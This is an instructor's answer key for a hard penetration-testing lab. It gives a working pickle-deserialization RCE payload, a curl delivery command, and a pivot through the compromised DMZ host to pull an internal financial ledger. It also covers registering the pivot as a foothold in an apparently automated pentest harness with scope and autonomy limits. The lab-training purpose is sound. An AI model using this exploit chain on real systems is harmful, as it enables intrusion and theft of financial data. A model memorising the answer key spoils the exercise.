# Solution — 09 Bastion Pivot (hard)

> Spoilers — instructor's answer key.

## Chain (RCE -> pivot -> crown jewels)

1. **Insecure deserialization RCE.** The portal restores a base64 `session` cookie with
   `pickle.loads`. Craft a payload whose `__reduce__` runs a command and returns its output
   (so you can read it in the response):
   ```python
   import pickle, base64, subprocess
   class E:
       def __reduce__(self):
           return (subprocess.check_output, (["id"],))
   print(base64.b64encode(pickle.dumps(E())).decode())
   ```
   ```sh
   curl -s http://127.0.0.1:8109/ --cookie "session=<payload>"   # -> uid=0(root)...
   ```
2. **Enumerate the foothold.** Run commands via the same primitive: `cat /opt/app/NOTES.txt`
   reveals the internal admin console `http://admin.internal:8000/` (`/db` export). Note the
   DMZ host has a second interface on `10.9.0.0/24`.
3. **Pivot.** The internal console is unroutable from your machine; reach it *through* the
   DMZ RCE:
   ```python
   __reduce__ -> (subprocess.check_output,
       (["python3","-c","import urllib.request;print(urllib.request.urlopen('http://admin.internal:8000/db').read())"],))
   ```
   returns the **ledger** (Blackwood Holdings SA, Meridian Freight Ltd, … — IBANs, balances).

## Via skuggi (the foothold flow)

Once the DMZ RCE is a reliable command primitive, register it as a **foothold** so the
harness routes internal-host commands through it automatically:

```
add foothold portal.bastion.lab command 10.9.0.0/24,admin.internal <rce-wrapper> {cmd}
```

`<rce-wrapper>` is whatever runs an inner command on the DMZ host (your pickle-RCE
one-liner, or `ssh`/webshell if you planted one), with `{cmd}` where the inner command
goes. After that, a normal in-scope command against the internal host —
`curl http://admin.internal:8000/db` — is wrapped and run through the foothold; the
scope guard still authorises `admin.internal` on the real target first, and (because a
pivot is an intrusive act) it runs unattended only with the autonomous ceiling raised to
`intrusive`. `show footholds` lists the route; the engagement report records it under
**Access path (pivots)**.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `dmz-foothold-note` | `admin.internal:8000` pointer | DMZ `/opt/app/NOTES.txt` (via RCE) |
| `crown-jewels` | `Blackwood Holdings SA`, IBANs, balances | internal `admin.internal/db` (via pivot) |

## Reset

`make lab-restore LAB=09-hard-bastion-pivot` (recreate — both hosts rebuild from baked-in content).
